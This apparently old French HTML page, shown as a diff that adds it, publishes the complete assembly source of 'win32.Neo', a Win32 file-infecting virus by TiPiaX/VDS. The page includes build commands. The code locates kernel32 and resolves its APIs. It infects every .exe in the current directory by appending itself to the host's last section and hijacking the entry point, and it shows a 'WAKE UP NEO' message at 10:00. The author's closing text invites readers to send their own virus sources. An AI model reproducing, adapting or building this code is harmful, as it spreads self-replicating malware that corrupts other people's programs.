@@ -1,0 +1,594 @@
+<html>
+<head>
+<title>WIN32.NEO par TiPiaX</title>
+</head>
+<body bgcolor=#000000>
+<center>
+</font>
+<pre>
+<font size=2 color=#ffff00>
+******************************************************************************
+{{{{{{{{{{{{{{{{{{{{{{{{  EXEMPLE DE VIRUS WIN32  }}}}}}}}}}}}}}}}}}}}}}}}}}}}
+******************************************************************************
+</center> </font> </pre> <font size=3 color=#FF0000>
+<br><pre>
+
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+;
+; win32.Neo by TiPiaX/VDS - 2001
+; Hccc RuLeZ On that WorlD
+;
+; Caractéristiques:
+; - Infecte tous les exes du répertoire courant.
+; - Se place dans la dernière section de l'hôte
+; - Utilise les Apis win32 et la méthode de la pile pour trouver
+;   le kernel
+; - Payload : boite de message "WAKE UP NEO" à 10 heures précises.
+;
+; Greetz: #virus #vxers #crack.fr, Mandag0re, Bendi, Del_Armg0
+; LordJulus, Christal, Pointbat, Drak, Cynabs, Androgyne.
+; GO GET FUCKED Mist
+;
+; Le programme se servant de la section de code comme data, vous devez changer
+; la caractéristique de la section .code en E0000020 avec procdump par exemple.
+;
+; Pour compiler:
+; tasm32 -ml -m5 -q win32neo.asm
+; tlink32 -Tpe -aa -x -c win32neo.obj ,,,import32
+;
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+
+.386
+locals
+jumps
+
+.model flat, stdcall
+
+extrn ExitProcess:NEAR
+extrn MessageBoxA:NEAR
+
+OPEN_EXISTING	equ	3
+GENERIC_WRITE	equ	40000000h
+GENERIC_READ	equ	80000000h
+LMEM_FIXED      equ	0
+LMEM_ZEROINIT	equ	40h
+LPTR		equ	LMEM_FIXED + LMEM_ZEROINIT
+
+TAILLE_VIRUS	equ	(offset fin_virus - offset start)
+
+                                               ;
+filetime                        STRUC          ;
+	FT_dwLowDateTime        DD ?           ; structure filetime
+	FT_dwHighDateTime       DD ?           ;
+filetime                        ENDS           ;
+                                               ;
+win32_find_data                 STRUC          ;
+	FileAttributes          DD ?           ; les attributs
+	CreationTime            filetime ?     ; date de création
+	LastAccessTime          filetime ?     ; dernier acces
+	LastWriteTime           filetime ?     ; derniere modification
+	FileSizeHigh            DD ?           ; taille du fichier
+	FileSizeLow             DD ?           ; taille du fichier
+	Reserved0               DD ?           ;
+	Reserved1               DD ?           ;
+	FileName                DB 260 DUP (?) ; nom long de fichier
+	AlternateFileName       DB 13 DUP (?)  ; nom court de fichier
+                                DB 3 DUP (?)   ; padding
+win32_find_data                 ENDS           ;
+
+
+SYSTEMTIME			STRUC
+	wYear			DW	  0
+	wMonth			DW	  0
+	wDayOfWeek		DW	  0
+	wDay			DW	  0
+	wHour			DW	  0
+	wMinute			DW	  0
+	wSecond			DW	  0
+	wMilliseconds		DW	  0
+SYSTEMTIME			ENDS
+
+
+.data
+
+signature	db	"Neo Virus by [TiPiaX/VDS]",0
+petitmessage    db	"L'infection à été réalisée",0
+
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+; Corps du programme
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+
+.code                                          ; Entry Point
+start:                                         ;
+	mov	edx, [esp]                     ; Methode de la pile
+                                               ;
+	call	delta                          ; Calcul du delta offset
+delta:                                         ;
+	pop	ebp                            ;
+	sub	ebp, offset delta              ; 
+                                               ;
+	mov	[ebp+espval],edx               ;
+	lea	eax,[ebp+SearchKernel]         ; On recherche le kernel
+	call	eax                            ;
+	lea	eax,[ebp+APIsearch]            ; On recherche les APIs
+	call	eax                            ;
+        mov	eax, [ebp+AENTRYPOINT]         ; met la valeur de retour
+	mov	[ebp+THEENTRYPOINT],eax        ; dans THEENTRYPOINT.
+                                               ;
+	lea	eax,[ebp+Infecte_Dir]          ; On part à l'infection
+	call	eax                            ;
+                                               ;
+	lea	eax,[ebp+Payload]              ; Le Payload
+	call	eax                            ;
+                                               ;
+on_se_trace:                                   ;
+         cmp	ebp, 0                         ; exe de départ ?
+         je	firstgen                       ; oui, on saute
+         mov	eax, [ebp+THEENTRYPOINT]       ; restore l'ancien entry point
+         jmp	eax                            ; et on éxécute le prog hôte
+                                               ;
+firstgen:                                      ;
+
+	call	MessageBoxA,0,offset petitmessage,offset signature,0
+	call	ExitProcess,0
+
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+;*******************************************************************************
+; Kernel Search Proc.
+; Modifie : PeHeader et Kernel32 dwords.
+; Nécéssité d'une valeur de kernel dans 'espval' en entrée.
+;*******************************************************************************
+SearchKernel PROC
+                                               ;
+mov	edx, [ebp+espval]                      ;
+mov	eax,edx                                ; On sauve cette valeur
+                                               ;
+                                               ;
+AND	edx,0FFFF0000h                         ; On diminue la recherche
+inc edx                                        ;
+                                               ;
+boucle:                                        ;
+	dec	edx                            ; un cran de moins
+	cmp	word ptr [edx], "ZM"           ; Cherche le MZ Header
+	jnz	boucle                         ; on repart
+                                               ;
+MZ_found:                                      ;
+	mov	ecx, edx                       ;
+	mov	ecx, [ecx+03ch]                ;
+	add	ecx, edx                       ;
+	cmp	ecx, eax                       ;
+	jg	boucle                         ; vérifie que c'est une adresse valide
+	cmp	word ptr [ecx] , "EP"          ; On a le PeHeader ?
+	jnz	boucle                         ; Non ! on repart
+                                               ;
+	mov	[ebp+kernel32], edx            ; stocke l'ImageBase du kernel
+	mov	[ebp+PeHeader], ecx            ; stocke L'ImageBase du PeHeader
+                                               ;
+                                               ;
+ret
+SearchKernel endp
+
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+;*******************************************************************************
+;  APIs Search Routine
+;  kernel32 = ImageBase du kernel
+;  PeHeader = ImageBase du PeHeader
+;*******************************************************************************
+APIsearch PROC
+                                               ;
+	mov	edi, [ebp+PeHeader]            ; EDI = adresse du PeHeader
+                                               ;
+	mov	esi, [edi+78H]                 ; 78H = addresse de l'export table
+	add	esi, [ebp+kernel32]            ; on additionne l'ImageBase de kernel32
+                                               ; esi pointe l'export table
+	mov	edi, [esi+12]                  ;
+	add	edi, [ebp+kernel32]            ;
+	cmp	dword ptr [edi], "NREK"        ; on a bien l'export table du Kernel ?
+	jne	on_se_trace                    ;
+                                               ;
+	mov	eax, dword ptr [esi+18h]       ;
+	add	eax, [ebp+kernel32]            ;
+	mov	[ebp+limit], eax               ; Nombre de noms de fonctions
+                                               ;
+	mov	eax, dword ptr [esi+1Ch]       ;
+	add	eax, [ebp+kernel32]            ;
+	mov	[ebp+AddFunc], eax             ; Adresses des fonctions exportés
+                                               ;
+	mov	eax, dword ptr [esi+20h]       ;
+	add	eax, [ebp+kernel32]            ;
+	mov	[ebp+AddName], eax             ; Adresses des noms des fonctions exportés
+                                               ;
+	mov	eax, dword ptr [esi+24h]       ;
+	add	eax, [ebp+kernel32]            ;
+	mov	[ebp+AddOrd], eax              ; adresses des exported oridinals
+
+;-------------------------------------------------------------------------------
+; On a tous les ingrédients, partons à la pêche aux APIs
+;-------------------------------------------------------------------------------
+
+	mov	esi, [ebp+AddName]             ; ESI = premier pointeur sur une adresse
+	mov	[ebp+Nindex], esi              ; Nindex = adresse des adresses des fonctions
+	mov	edi, [esi]                     ; on normalise
+	add	edi, [ebp+kernel32]            ; EDI = pointeur sur la liste des noms
+	mov	ecx, 0                         ; ECX = compteur à 0
+	lea	ebx, [ebp+First_API]           ; GetProcAddress.
+                                               ;
+   onrepart:                                   ;
+	mov	esi, ebx                       ; ESI pointe sur le nom
+                                               ; qu'on recherche (GetProcAddress)
+   compare:                                    ;
+	cmpsb                                  ; les 2 bytes sont pareils ?
+	jne	prochain                       ; non ! on essaie une autre fonction
+                                               ;
+	cmp	byte ptr [edi], 0              ; le buffer entier est correct ?
+	je	cavachier                      ; YES !
+	jmp	compare                        ; non... on essaie le prochain byte
+                                               ;
+   prochain:                                   ;
+	inc	cx                             ; incremente le compteur
+	cmp	cx, word ptr [ebp+limit]       ; on vérifie qu'on ne dépasse pas la limite
+	jge	on_se_trace                    ; sinon erreur
+                                               ;
+	add	dword ptr [ebp+Nindex], 4      ; on choppe le prochain pointeur
+	mov	esi, [ebp+Nindex]              ; on refait la manip
+	mov	edi, [esi]                     ; EDI = pointeur sur la prochaine fonction
+	add	edi, [ebp+kernel32]            ; on normalise
+	jmp	onrepart                       ; et on repart...
+                                               ;
+;CX = index dans les ordinals
+;CX * 2 + [Address of Ordinals] = Ordinal
+;Ordinal * 4 + [Address of Functions] = Address of Function (RVA)
+                                               ;
+   cavachier:                                  ;
+	shl	ecx, 1                         ; ECX = ECX * 2
+	mov	esi, [ebp+AddOrd]              ;
+	add	esi, ecx                       ; ajoute l'adresse des ordinals
+	xor 	eax, eax                       ;
+	mov	ax, word ptr [esi]             ; on choppe l'Ordinal
+	shl	eax, 2                         ; Ordinal = Ordinal * 4
+	mov	esi, [ebp+AddFunc]             ;
+	add	esi, eax                       ; Ajoute l'addresse des fonctions
+	mov	edi, dword ptr [esi]           ; choppe la RVA
+	add	edi, [ebp+kernel32]            ; ajoute ImageBase du kernel
+                                               ;
+	mov	[ebp+AGetProcAddress], edi     ; on le sauve ! On a gagné ! :)
+                                               ;
+;-------------------------------------------------------------------------------
+; Fonctions qui récupère toutes les APIs dont nous avons besoin
+; dans Kernel32.dll
+;-------------------------------------------------------------------------------
+                                               ;
+	lea	esi, NExitProcess              ;
+	lea	edi, AExitProcess              ; On prépare la recherche des APIs
+	add	esi, ebp                       ; On normalise
+	add	edi, ebp                       ;
+                                               ;
+find_apis:                                     ;
+                                               ;
+	push	esi                            ; Nom de l'API
+	push	[ebp+kernel32]                 ; Module de Kernel32
+	call	[ebp+AGetProcAddress]          ; API qui nous donne
+	cmp	eax,0                          ; l'adresse de l'API recherchée
+	je	on_se_trace                    ;
+	stosd                                  ; copie l'adresse là où pointe EDI
+                                               ; puis ajoute 4 à EDI
+                                               ;
+choppe_prochaine_api:                          ;
+	inc	esi                            ; on choppe le prochain nom d'API
+	cmp	byte ptr [esi], 0              ;
+	jne	choppe_prochaine_api           ;
+                                               ;
+	inc	esi                            ;
+	cmp	byte ptr [esi], 0FFh           ; On regarde si on est arrivé à la fin
+	jne	find_apis                      ;
+
+;-------------------------------------------------------------------------------
+; Fonctions qui récupère toutes les APIs dont nous avons besoin
+; dans User32.dll
+;-------------------------------------------------------------------------------
+
+	lea	eax, [ebp+Nuser32]             ; On prend l'ImageBase de user32.dll
+	push	eax                            ; grace à GetModuleHandle.
+	call	[ebp+AGetModuleHandleA]        ;
+	cmp	eax, 0                         ;
+	je	on_se_trace                    ;
+	mov	[ebp+user32],eax               ; On stocke cette valeur dans user32.
+                                               ;
+	lea	esi, NMessageBoxA              ; On recherche en premier MessageBoxA
+	lea	edi, AMessageBoxA              ;
+	add	esi, ebp                       ; On normalise
+	add	edi, ebp                       ;
+                                               ;
+find_user_apis:                                ;
+                                               ;
+	push	esi                            ; On refait la même chose qu'avec Kernel32
+	push	[ebp+user32]                   ; pour trouver toutes les adresses des APIs
+	call	[ebp+AGetProcAddress]          ; de user32.dll dont nous avons besoin
+	cmp	eax,0                          ;
+	je	on_se_trace                    ;
+	stosd                                  ; copie l'adresse là où pointe EDI
+                                               ; puis ajoute 4 à EDI
+choppe_user_api:                               ;
+	inc	esi                            ; on choppe le prochain nom d'API
+	cmp	byte ptr [esi], 0              ;
+	jne	choppe_user_api                ;
+                                               ;
+	inc	esi                            ;
+	cmp	byte ptr [esi], 0FFh           ; On regarde si on est arrivé à la fin
+	jne	find_user_apis                 ;
+                                               ;
+                                               ;
+ret
+APIsearch endp
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+;*******************************************************************************
+; Infecte_Dir Proc
+;*******************************************************************************
+Infecte_Dir PROC
+
+	lea	ecx, [ebp+offset search]       ; adresse de notre structure
+	lea	eax, [ebp+exestr]              ; String de recherche: *exe
+	call	[ebp+AFindFirstFileA],eax,ecx  ; ;)
+                                               ;
+	cmp	eax, 0FFFFFFFFh                ; pas de fichier ?
+	je	nofile                         ; oui ! on part.
+                                               ;
+	mov	[ebp+SearchHandle],eax         ; handle de la recherche en eax
+
+encore:
+
+	lea	eax, [ebp+InfectMe]            ; Mouhahahahhahaha
+	call	eax                            ; Gniak, on infecte toute le dossier
+                                               ; fichier par fichier.
+	lea	edi, [ebp+offset search]       ; adresse de notre structure
+	lea	edi, [edi.FileName]            ;
+	mov	ecx, 13d                       ;
+	mov	al, 0                          ; = ZeroMemory sur filename
+	rep	stosb                          ;
+                                               ;
+	lea	edi, [ebp+offset search]       ; adresse de notre structure
+	mov	eax, [ebp+SearchHandle]        ; le handle
+	call	[ebp+AFindNextFileA],eax,edi   ; ;)
+	cmp	eax, 0                         ; Y en a plus ?
+	jne	encore                         ; non ! on repart à l'infection ;)
+
+	ret                                    ; bye
+
+nofile:
+
+ret
+Infecte_Dir endp
+;*******************************************************************************
+
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+;*******************************************************************************
+; InfectMe Proc
+;*******************************************************************************
+InfectMe PROC
+
+	lea	edi, [ebp+offset search]       ; edi pointe la structure
+	lea	edx, [edi.FileName]            ;
+
+call	[ebp+ACreateFileA],edx,GENERIC_READ+GENERIC_WRITE,0,0,OPEN_EXISTING,0,0
+
+	cmp	eax, -1                        ; On ouvre le fichier et on vérifie
+	je	impossible                     ; qu'il n'y a pas d'erreurs
+
+	mov 	[ebp+handle], eax              ; Prépare l'allocation de mémoire
+	call	[ebp+AGetFileSize], eax ,0     ;
+	add	eax, 1000h                     ; + taille pour être tranquille
+	mov	[ebp+size], eax                ;
+
+;----------------------------------------------------------------------
+;---Alloue un espace memoire et inscrit le fichier dedans--------------
+;----------------------------------------------------------------------
+
+	call	[ebp+ALocalAlloc], LPTR, eax
+	mov	edi,eax
+	lea	ecx,[ebp+byteread]
+
+call	[ebp+AReadFile],[handle+ebp],edi,[ebp+size],ecx,0  ;lecture du fichier
+
+;----------------------------------------------------------------------
+;---cherche la présence d'un MZ Header puis PE Header------------------
+;----------------------------------------------------------------------
+
+	cmp	word ptr [edi],'ZM'            ; verification s'il s'agit bien d'un EXE
+	jne	impossible                     ; Si erreur, on s'échappe
+
+
+	movzx	ecx, word ptr [edi+3Ch]        ; adresse de l'adresse du PE Header
+                                               ; le movzx permet d'éviter un plantage si la valeur
+                                               ; est trop grande.
+	add	ecx, edi                       ; ebx pointe sur le PE Header
+	cmp	word ptr[ecx], 'EP'            ; verification s'il s'agit bien d'un PE Executable
+	jne	impossible                     ;
+                                               ;
+	cmp	word ptr [edi+38h], 'ZZ'       ; vérifie que c'est pas déjà infecté
+	je	impossible                     ;
+                                               ;
+                                               ; ECX = adresse du PeHeader
+	mov	ebx, ecx                       ; EBX = adresse du PeHeader
+                                               ;
+	movzx 	edx, word ptr [ecx+6]	       ; nombre de sections dans edx
+	dec	edx                            ; on veut la dernière section
+	add	dword ptr[ecx+80],TAILLE_VIRUS ; on réajuste size_of_image
+                                               ;
+	add	ecx, 248                       ; ecx pointe le section header
+	imul	edx, 40                        ; 40 = taille d'une section dans ce header
+	add	ecx, edx                       ; ECX POINTE SUR LA DERNIERE SECTION.
+                                               ;
+	or	dword ptr [ecx+36], 0E0000020h ; Characterics : read/write/exec
+                                               ;
+	mov	eax, [ecx+16]                  ; raw size dans eax
+	mov	edx, eax                       ; et dans edx
+	add	dword ptr[ecx+16],TAILLE_VIRUS ; ajuste la raw size
+                                               ;
+	add	edx, [ecx+12]                  ;EntryPoint = Virtual Offset + RawSize originale
+	add	eax, [ecx+20]                  ;endroit où copier le virus = RawSize + RawOffset
+                                               ;
+	mov 	esi, [ecx+16]                  ; nouvelle raw size
+	mov 	dword ptr [ecx+8], esi         ; VirtualSize = SizeOfRawData
+                                               ;
+	mov	ecx, dword ptr [ebx+40]        ; ancien EntryPoint
+	mov	[ebp+AENTRYPOINT], ecx         ; on sauve l'ancien EntryPoint
+	mov	ecx, dword ptr [ebx+52]        ; l'image base en ebx
+  	add	[ebp+AENTRYPOINT], ecx         ; on l'ajoute à l'EntryPoint
+                                               ;
+	mov	dword ptr [ebx+40], edx        ; le nouvel EntryPoint
+                                               ;
+	mov	word ptr [edi+38h], 'ZZ'       ; marque d'infection
+	push	edi                            ;
+	add	edi, eax                       ; endroit où copier le virus en virtual
+	lea	esi, [ebp+start]               ; pointeur sur le code à copier
+	mov	ecx, TAILLE_VIRUS              ; Nb de bytes à copier
+	rep	movsb                          ; On copie le code viral
+	pop	edi
+
+call	[ebp+ASetFilePointer],[ebp+handle],0,0,0 ;Pointeur au début du fichier
+	lea	eax, byteread                  ;
+	add	eax,ebp                        ;
+call	[ebp+AWriteFile],[ebp+handle], edi, [ebp+size], eax, 0 ;ecrit les modifications
+	cmp	eax, 0                         ;
+	je	on_se_trace                    ;
+
+impossible:
+
+	call 	[ebp+ACloseHandle], [handle+ebp]; Fermeture du fichier
+	call 	[ebp+ALocalFree], edi           ; Liberation de la memoire
+
+ret
+
+
+InfectMe endp
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+;*******************************************************************************
+; Payload Proc
+;*******************************************************************************
+Payload PROC
+
+	lea	eax, [ebp+time]                ; EAX pointe la structure systemtime
+	call	[ebp+AGetLocalTime],eax        ; recupère les infos relatives au temps
+                                               ;
+	cmp	word ptr [ebp+time+wHour], 10  ; il est 10 heures ?
+	jne	pasdepayload                   ;
+                                               ;
+	cmp	word ptr [ebp+time+wMinute],0  ; il est 10 h 00 ?
+	jne	pasdepayload                   ;
+                                               ;
+	lea	eax, [ebp+PayTitre]            ;
+	lea	edx, [ebp+PayMessage]          ; Wake up neo
+	call	[ebp+AMessageBoxA],0,edx,eax,0 ; Affiche le nom du fichier
+
+ret
+
+pasdepayload:
+ret
+
+Payload endp
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+
+;datas
+
+
+Nuser32       db  "User32.dll",0
+
+kernel32      dd  0
+user32        dd  0
+PeHeader      dd  0
+limit         dd  0
+AddName       dd  0
+AddFunc       dd  0
+AddOrd        dd  0
+Nindex        dd  0
+espval        dd  0
+SearchHandle  dd  0
+handle        dd  0
+size          dd  0
+
+byteread      dw  ?
+
+AENTRYPOINT   dd  0
+THEENTRYPOINT dd  0
+IMAGEBASE     dd  0
+
+
+;__--==*** Apis dans Kernel32.dll ***==--__
+;¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨
+
+First_API              db  "GetProcAddress",0
+NExitProcess           db  "ExitProcess",0
+NGetModuleHandleA      db  "GetModuleHandleA",0
+NGetCurrentDirectoryA  db  "GetCurrentDirectoryA",0
+NFindFirstFileA        db  "FindFirstFileA",0
+NFindNextFileA         db  "FindNextFileA",0
+NCreateFileA           db  "CreateFileA",0
+NGetFileSize           db  "GetFileSize",0
+NLocalAlloc            db  "LocalAlloc",0
+NReadFile              db  "ReadFile",0
+NSetFilePointer        db  "SetFilePointer",0
+NWriteFile             db  "WriteFile",0
+NCloseHandle           db  "CloseHandle",0
+NLocalFree             db  "LocalFree",0
+NGetLocalTime          db  "GetLocalTime",0
+db 0FFh
+
+AGetProcAddress        dd  0
+AExitProcess           dd  0
+AGetModuleHandleA      dd  0
+AGetCurrentDirectoryA  dd  0
+AFindFirstFileA        dd  0
+AFindNextFileA         dd  0
+ACreateFileA           dd  0
+AGetFileSize           dd  0
+ALocalAlloc            dd  0
+AReadFile              dd  0
+ASetFilePointer        dd  0
+AWriteFile             dd  0
+ACloseHandle           dd  0
+ALocalFree             dd  0
+AGetLocalTime          dd  0
+
+
+;__--==*** Apis dans User32.dll ***==--__
+;¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨
+
+NMessageBoxA           db  "MessageBoxA",0 
+db 0FFh
+AMessageBoxA           dd  0
+
+PayTitre               db  "---===***^°°°^***===---",0
+PayMessage             db  ">>> WAKE UP NEO ! <<<",0
+
+time      SYSTEMTIME      ?                    ; structure systemtime
+search    win32_find_data ?                    ; structure de recherche
+exestr  db  "*.exe",0
+
+fin_virus:
+end start
+
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+
+</font>
+</pre>
+<font size=3 color=#FFFFFF>
+Et voila vous avez le droit au code de mon premier virus win32. J'espère qu'il vous plaira.
+Pour l'instant y a pas trop de risques qu'il se reproduise car il n'infecte que le
+répertoire courant. La raison de cela est simple : j'ai pas de testeurs moi et j'ai pas
+envie de formater mon dur à chaque fois que je teste le virus. N'hésitez pas à m'envoyer
+vos sources, et ça serait cool de me dire si ce source vous a servi. Voila. ++.<br>
+ps: Ne faites pas de payloads destructeurs si vous ditribuez vos virus. Si vous avez
+envie de le faire (ce qui reste compréhensible) garder tout ça pour vous, c'est mieux.
+<font size=3 color=#ffff00><br><br>
+<center>
+<pre>TiPiaX/VDS</pre>
+<br>
+</font></body></html>
